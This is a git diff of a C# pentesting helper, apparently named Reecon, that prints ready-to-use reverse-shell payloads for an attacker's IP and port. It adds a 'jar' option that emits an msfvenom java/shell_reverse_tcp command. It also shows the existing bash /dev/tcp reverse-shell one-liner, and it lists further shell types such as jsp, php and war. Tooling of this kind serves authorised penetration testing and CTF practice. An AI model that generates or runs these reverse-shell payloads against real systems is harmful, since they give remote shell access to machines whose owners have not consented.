@@ -11,15 +11,15 @@ namespace Reecon
         {
             if (args.Length < 2)
             {
-                Console.WriteLine("Shell Usage: reecon --shell shellType [IP Port]");
-                Console.WriteLine("Types: bash, jsp, nc, nodejs, php, python, war");
+                Console.WriteLine("Shell Usage: reecon -shell shellType [IP Port]");
+                Console.WriteLine("Types: bash, jar, jsp, nc, nodejs, php, python, war");
                 General.PrintIPList();
                 return;
             }
             string shellType = args[1];
             // If we have a tun0 IP, use that instead as the default
             List<General.IP> ipList = General.GetIPList();
-            string ip = ipList.Count(x => x.Name == "tun0") != 0 ? ipList.FirstOrDefault(x => x.Name == "tun0").Address.ToString() : "10.0.0.1";
+            string ip = ipList.Any(x => x.Name == "tun0") ? ipList.FirstOrDefault(x => x.Name == "tun0").Address.ToString() : "10.0.0.1";
             string port = "9001";
             if (args.Length == 2)
             {
@@ -40,6 +40,15 @@ namespace Reecon
                 Console.WriteLine("Bash Shell");
                 Console.WriteLine("----------");
                 Console.WriteLine(BashShell(ip, port));
+            }
+            else if (shellType == "jar")
+            {
+                Console.WriteLine("Java Shell");
+                Console.WriteLine("----------");
+                Console.WriteLine(JavaShell(ip, port));
+                Console.WriteLine();
+                Console.WriteLine("--> Can just use a normal nc listener");
+
             }
             else if (shellType == "jsp")
             {
@@ -99,6 +108,13 @@ namespace Reecon
         {
             // http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
             return "#!/bin/bash" + Environment.NewLine + "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1" + Environment.NewLine + "Note: File header is only required if it's a file and not a command";
+        }
+
+        private static string JavaShell(string ip, string port)
+        {
+            // Can catch with a default nc listener - No need to use metasploit
+            // Should do a proper one later...
+            return $"msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.jar";
         }
 
         private static string JSPShell(string ip, string port)
